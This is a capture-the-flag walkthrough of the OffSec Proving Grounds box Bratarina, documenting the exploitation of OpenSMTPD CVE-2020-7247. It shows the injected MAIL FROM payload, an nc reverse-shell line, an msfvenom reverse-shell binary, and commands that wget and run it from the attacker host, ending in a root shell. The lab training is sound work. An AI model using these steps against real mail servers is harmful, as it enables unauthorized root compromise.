---
title: "Bratarina (OffSec PG) — Walkthrough: OpenSMTPD CVE-2020-7247 MAIL FROM RCE"
description: "OffSec Proving Grounds Bratarina walkthrough — unauthenticated RCE through OpenSMTPD CVE-2020-7247 MAIL FROM command injection, landing instant root with no privesc required."
date: 2026-08-01 09:00:00 +0000
categories: [CTF]
tags: [ctf, offsec, proving-grounds, linux, smtp, rce, cve-2020-7247, opensmtpd]
difficulty: Easy
---

> **Box:** OffSec Proving Grounds — Bratarina · **OS:** Linux (Ubuntu) · **Theme:** OpenSMTPD RCE → instant root

Rooted this one through the OpenSMTPD `MAIL FROM` RCE (**CVE-2020-7247**). No privesc stage — the mail daemon runs as root, so the RCE dropped me straight in as root. Here's how I did it.

- **Box:** `192.168.111.71`
- **Me:** `192.168.45.210`

---

## Recon

Kicked things off with rustscan and let it hand the open ports off to nmap:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec]
└─$ rustscan -a 192.168.111.71 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Open 192.168.111.71:22
Open 192.168.111.71:25
Open 192.168.111.71:80
Open 192.168.111.71:445
[~] Starting Script(s)
{% raw %}[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A"{% endraw %} on ip 192.168.111.71

PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open  smtp        syn-ack ttl 61 OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.210], pleased to meet you,
|_ 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
80/tcp  open  http        syn-ack ttl 61 nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)

Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%) ...

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   FQDN: bratarina
|_  System time: 2026-08-01T11:26:08-04:00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four ports: SSH (22), SMTP (25), HTTP (80 → FlaskBB), SMB (445 → Samba, workgroup `COFFEECORP`).

SSH is patched, the web app is just a default FlaskBB "page not found," and SMB has guest access with signing disabled. All noted, but the moment I saw **OpenSMTPD on 25** that was my target — it has a known unauthenticated RCE and the daemon runs as root.

> **Note:** `smb-os-discovery` says "Windows 6.1" — that's just Samba spoofing a Windows version. The host is Linux, per the SSH banner and `Service Info`.

---

## SMTP Enum (Port 25)

Telnet'd in first to confirm the service before touching any exploit:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec]
└─$ telnet 192.168.111.71 25
Trying 192.168.111.71...
Connected to 192.168.111.71.
Escape character is '^]'.
220 bratarina ESMTP OpenSMTPD
ls
500 5.5.1 Invalid command: Command unrecognized
help
214-2.0.0 This is OpenSMTPD
214-2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org
214-2.0.0 with full details
214 2.0.0 End of HELP info
```

`220 bratarina ESMTP OpenSMTPD` — confirmed. Straight to searchsploit:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec]
└─$ searchsploit OpenSMTPD 2.0.0
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote     | openbsd/remote/48140.c
Code Execution                                                |
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

OpenSMTPD `< 6.6.3p1` → RCE + LPE. That's **CVE-2020-7247** — command injection through the `MAIL FROM` address field. Since OpenSMTPD's delivery process runs as root, code execution here is basically instant root.

---

## Exploitation

### Metasploit (failed)

Quick attempt with the MSF module first:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec]
└─$ msfconsole

       =[ metasploit v6.4.133-dev                          ]
+ -- --=[ 2,647 exploits - 1,335 auxiliary - 2,141 payloads ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion     ]

msf > search OpenSMTPD

Matching Modules
================
   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/smtp/opensmtpd_mail_from_rce  2020-01-28       excellent  Yes    OpenSMTPD MAIL FROM Remote Code Execution
   1  exploit/unix/local/opensmtpd_oob_read_lpe  2020-02-24       average    Yes    OpenSMTPD OOB Read Local Privilege Escalation

msf > use 0
[*] Using configured payload cmd/unix/reverse_netcat
msf exploit(unix/smtp/opensmtpd_mail_from_rce) > set RHOSTS 192.168.111.71
RHOSTS => 192.168.111.71
msf exploit(unix/smtp/opensmtpd_mail_from_rce) > set LHOST 192.168.45.210
LHOST => 192.168.45.210
msf exploit(unix/smtp/opensmtpd_mail_from_rce) > exploit

[*] Started reverse TCP handler on 192.168.45.210:4444
[*] 192.168.111.71:25 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.168.111.71:25 - The service is running, but could not be validated. OpenSMTPD detected
[*] 192.168.111.71:25 - Connecting to OpenSMTPD
[*] 192.168.111.71:25 - Saying hello and sending exploit
[*] 192.168.111.71:25 - Sending: MAIL FROM:<;for n in 3 N P b w p 3 Z X Z T b j i;do read n;done;sh;exit 0;>
[*] 192.168.111.71:25 - Sending: RCPT TO:<root>
[*] 192.168.111.71:25 - Sending: DATA
[*] 192.168.111.71:25 - Sending: mkfifo /tmp/pxbdf; nc 192.168.45.210 4444 0</tmp/pxbdf | /bin/sh >/tmp/pxbdf 2>&1; rm /tmp/pxbdf
[*] 192.168.111.71:25 - Sending: QUIT
[*] Exploit completed, but no session was created.
```

Payload got accepted for delivery but no session came back — this module is flaky. Didn't troubleshoot, went manual.

### Manual exploit with 47984.py

Built a custom msfvenom ELF to control exactly what gets executed:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Bratarina]
└─$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.45.210 LPORT=445
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
```

Hosted it over HTTP so the box can pull it:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Bratarina]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.111.71 - - [01/Aug/2026 23:27:29] "GET /shell HTTP/1.1" 200 -
```

Then used the standalone PoC (`47984.py` — same CVE-2020-7247) to run three commands: download the payload, make it executable, execute it.

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Bratarina]
└─$ python3 47984.py 192.168.111.71 25 'wget 192.168.45.210/shell -O /tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

┌──(kali㉿kali)-[~/Desktop/Offsec/Bratarina]
└─$ python3 47984.py 192.168.111.71 25 'chmod +x /tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

┌──(kali㉿kali)-[~/Desktop/Offsec/Bratarina]
└─$ python3 47984.py 192.168.111.71 25 '/tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

Listener on 445 (matching the msfvenom `LPORT`) caught the shell:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Bratarina]
└─$ sudo nc -nlvp 445
listening on [any] 445 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.111.71] 42280
proof.txt
cat proof.txt
ae7ecc6dcc014265942107d46c8adaf4
```

Landed straight as root — the mail delivery process runs as root, so there was no separate `local.txt` / privesc step. The foothold *was* the root shell.

**proof.txt:** `ae7ecc6dcc014265942107d46c8adaf4`

---

## TL;DR

- rustscan/nmap → OpenSMTPD on port 25
- OpenSMTPD `< 6.6.3p1` = **CVE-2020-7247** (`MAIL FROM` command injection RCE)
- MSF module sent the payload but never popped a session → went manual with `47984.py`
- Three-step delivery: `wget` ELF → `chmod +x` → execute
- Daemon runs as root → instant root shell, grabbed `proof.txt`
